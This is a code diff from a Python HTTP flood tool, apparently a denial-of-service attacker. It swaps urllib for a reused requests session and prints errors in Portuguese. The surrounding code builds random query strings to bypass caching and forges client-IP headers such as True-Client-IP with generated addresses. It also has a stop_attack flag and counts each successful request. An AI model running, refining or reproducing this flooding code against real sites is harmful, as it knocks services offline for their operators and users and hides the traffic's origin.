@@ -5,8 +5,7 @@ import re
 import ipaddress
 import time
 from datetime import datetime, timedelta
-import urllib.request
-import urllib.error
+import requests
 
 url = ''
 host = ''
@@ -55,6 +54,8 @@ def stop_attack():
     global flag
     flag = 2
 
+session = requests.Session()
+
 def httpcall(url):
     request_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
     headers = {
@@ -89,10 +90,9 @@ def httpcall(url):
         'True-Client-IP': generate_real_ip(),
     }
     try:
-        req = urllib.request.Request(request_url, headers=headers)
-        urllib.request.urlopen(req)
-    except urllib.error.URLError:
-        pass
+        response = session.get(request_url, headers=headers)
+    except requests.exceptions.RequestException as e:
+        print(f"Erro na solicitação: {e}")
     else:
         inc_counter()
 
